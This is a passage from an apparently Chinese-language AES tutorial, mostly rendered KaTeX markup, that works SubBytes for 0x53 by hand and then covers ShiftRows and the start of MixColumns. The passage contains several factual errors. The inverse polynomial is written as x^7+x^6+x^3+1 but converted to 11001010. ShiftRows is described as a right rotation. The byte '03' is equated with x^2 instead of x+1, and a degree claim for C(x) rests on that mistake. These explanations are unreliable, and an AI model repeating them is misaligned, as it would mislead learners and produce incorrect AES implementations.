class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = (x^5+x^4+x^3+x^2+1)p(x)+(x^7+x^6+x^3+x)q(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></p><p>显得简单了许多。</p><p>所以手动求逆有两个技巧  1. 减转化为加 2.设p(x)和q(x)。</p></li><li><p>现在我们得到了多项式的逆<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^7+x^6+x^3+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。再这个逆转化为二进制<code>11001010</code></p></li><li><p>让这个二进制乘上一个Z矩阵，再加上一个C矩阵。注意将那个二进制的矩阵低位在上，高位在下。</p><p><img src="https://upyun.wuuconix.link/image-20211002162017653.png" alt="字节替换公式" /></p><p>最后得到的矩阵为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}1 \\0 \\1 \\1 \\0 \\1 \\1 \\1 \\\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:9.60014em;vertical-align:-4.55007em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.05007em;"><span style="top:0.7500499999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-0.4049600000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-1.0049700000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-1.6049800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-2.2049900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-2.805em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.4050100000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.00502em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.605029999999999em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-5.2050399999999994em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-5.80505em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-7.05007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.55007em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.050000000000001em;"><span style="top:-7.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.00999999999999951em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:1.1899999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.55em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.05007em;"><span style="top:0.7500499999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-0.4049600000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-1.0049700000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-1.6049800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-2.2049900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-2.805em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.4050100000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.00502em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.605029999999999em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-5.2050399999999994em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-5.80505em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-7.05007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.55007em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>它代表的二进制是<code>10110111</code>嘛？不！刚才说过，低位在上，高位在下。实际的结果应该从下往上读<code>11101101</code> <code>0xed</code>。</p><p>这就是一开始输入字节<code>01010011</code> <code>0x53</code>的置换结果了！</p><p>如果要用程序实现这个过程，需要解决多项式求逆的难点，矩阵相乘倒是好求。</p><p>ok，现在我们解决了AES中的字节代替。</p><p>接下来我们看一看行移位。</p><p><img src="https://upyun.wuuconix.link/image-20211004133739724.png" alt="简单的行移位" /></p><p>手动实现和程序实现的难度都很低，第0行不变，第1行循环右移1，第二行循环右移2，第三行循环右移3。</p><p>然后是列混合。</p><p><img src="https://upyun.wuuconix.link/image-20211004134815114.png" alt="复杂的列混合" /></p><p>列混合实际是把一列转化为一个多项式，下面为高位，下面为低位。</p><p>即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mrow><mn>3</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msub><mi>C</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>C</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><mi>x</mi><mo>+</mo><msub><mi>C</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_{3, 0}x^3+C_{2, 0}x^2+C_{1, 0}x+C_{0,0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1002159999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1002159999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></p><p>值得注意的是每个C实际上是一个字节，它也可以等价转化为一个多项式。</p><p>所以上面这个多项式的实际次数可能不止3。</p><p>然后我们要把这个列对应的多项式乘上一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>3</mn><mo mathvariant="normal">′</mo></msup><msup><mi>x</mi><mn>3</mn></msup><msup><mo>+</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><msup><mi>x</mi><mn>2</mn></msup><msup><mo>+</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><msup><mi>x</mi><mn>1</mn></msup><msup><mo>+</mo><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>2</mn><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">C(x)=&#x27;03&#x27;x^3+&#x27;01&#x27;x^2+&#x27;01&#x27;x^1+&#x27;02&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mbin">+</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mbin">+</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mbin">+</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></p><p>同样的，这个C(x)和列多项式一样，实际的次数不止3次，因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup><mn>0</mn><msup><mn>3</mn><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">&#x27;03&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">0</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>对应了多项式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">x^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>。所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>这个多项式的最高次为5。</p><p>然后我要要做的是把列对应的多项式乘上这个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" 